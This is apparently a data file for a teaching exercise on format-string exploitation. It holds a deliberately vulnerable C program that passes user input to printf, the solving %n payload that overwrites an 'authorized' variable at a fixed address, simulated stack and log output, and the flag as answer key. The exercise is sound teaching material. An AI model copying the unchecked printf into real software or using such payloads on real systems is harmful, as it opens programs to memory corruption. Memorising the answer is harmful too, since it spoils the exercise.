@@ -1,0 +1,98 @@
+{
+ "exercise": "logic-08",
+ "title": "08: Format String: Writing",
+ "mode": "input-fmt-write",
+ "source": [
+  "#include <stdio.h>",
+  "",
+  "void win() { printf(\"FLAG\\n\"); }",
+  "",
+  "int authorized = 0;  // at 0x0804a020",
+  "",
+  "void vuln() {",
+  "    char buf[64];",
+  "    fgets(buf, 64, stdin);",
+  "    printf(buf);",
+  "    if (authorized) win();",
+  "}",
+  "",
+  "int main() {",
+  "    vuln();",
+  "    return 0;",
+  "}"
+ ],
+ "input": "\\x20\\xa0\\x04\\x08%x%x%x%n",
+ "stack": [
+  {
+   "slot": 1,
+   "value": 3221160448,
+   "label": "printf internal"
+  },
+  {
+   "slot": 2,
+   "value": 3221160192,
+   "label": "buf pointer"
+  },
+  {
+   "slot": 3,
+   "value": 64,
+   "label": "saved register"
+  },
+  {
+   "slot": 4,
+   "value": 134520864,
+   "label": "buf[0..3] — your address"
+  }
+ ],
+ "targetAddr": 134520864,
+ "baseAddr": 3221160192,
+ "logs": [
+  {
+   "cls": "info",
+   "msg": "═══ 08: Format String: Writing ═══"
+  },
+  {
+   "cls": "info",
+   "msg": "authorized is at 0x0804a020 — currently 0"
+  },
+  {
+   "cls": "action",
+   "msg": "printf(buf) — your input is the format string..."
+  },
+  {
+   "cls": "info",
+   "msg": ""
+  },
+  {
+   "cls": "info",
+   "msg": "First 4 bytes → address: 0x0804a020 ✓ matches authorized!"
+  },
+  {
+   "cls": "action",
+   "msg": "%x → read slot 1: 0xbfff0200 (printf internal)"
+  },
+  {
+   "cls": "action",
+   "msg": "%x → read slot 2: 0xbfff0100 (buf pointer)"
+  },
+  {
+   "cls": "action",
+   "msg": "%x → read slot 3: 0x00000040 (saved register)"
+  },
+  {
+   "cls": "action",
+   "msg": "%n → WRITE 28 (4 bytes) to address at slot 4: 0x0804a020"
+  },
+  {
+   "cls": "success",
+   "msg": "Wrote 28 to authorized! It's now non-zero → win() is called!"
+  },
+  {
+   "cls": "info",
+   "msg": ""
+  }
+ ],
+ "solved": true,
+ "winTitle": "FLAG{format_string_write}",
+ "winMsg": "You used %n to write a value to the authorized variable! Format string bugs are powerful — they let you read AND write arbitrary memory, all through printf."
+}
